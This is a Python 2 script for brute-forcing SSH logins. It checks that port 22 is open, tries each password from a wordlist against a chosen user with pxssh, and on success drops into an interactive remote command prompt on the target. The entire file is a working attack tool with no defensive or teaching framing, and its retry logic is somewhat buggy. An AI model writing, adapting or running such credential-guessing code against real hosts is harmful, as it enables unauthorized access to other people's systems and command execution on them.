import PortScan1
import PasswordGuessing
from pexpect import pxssh
import argparse
import time

ip=raw_input("ip Destination: ")
name = raw_input("name Destination: ")
pathFile=raw_input("path of passwords file: ")
port = raw_input("port for connect: ")

y = PortScan1
x = y.PortScanning
if x.scan(ip) == 0: #port 22 
    print "Port 22 is not open or mybe not check if you choose random scanning"
    exit()
print "Port 22 is open"

def connect(host, user, password, port):              #take host user and password
    global Found
    Fails = 0

    try:
        s = pxssh.pxssh()                       #s is ssh session
        s.login(host, user, password, port)           #try to login
        print 'Password Found: ' + password
        return s

    except Exception, e:
        if Fails > 10000:
            print "I chaecked 10,000 passwords"
            exit(0)
        elif 'read_nonblocking' in str(e):
            Fails += 1
            #time.sleep(5)
            return connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            #time.sleep(1)
            return connect(host, user, password,port)
        return None


def main(ip,user,passw,port):

    if ip and user and passw and port:
        with open(passw, 'r') as infile:
            for line in infile:
                password = line.strip('\r\n')
                print "Testing: " + str(password)
                con = connect(ip,user,password,port)
                if con:
                    print "[SSH connected, Issue commands (q or Q) To quit]"
                    command = raw_input(">")
                    while command != 'q' and command != 'Q':
                        con.sendline(command)
                        con.prompt()
                        print con.before
                        command = raw_input(">")
                else:
                		print "[SSH DON'T connected]"
    else:
        #print parser.usage
        exit(0)
        
main(ip,name,pathFile,port)
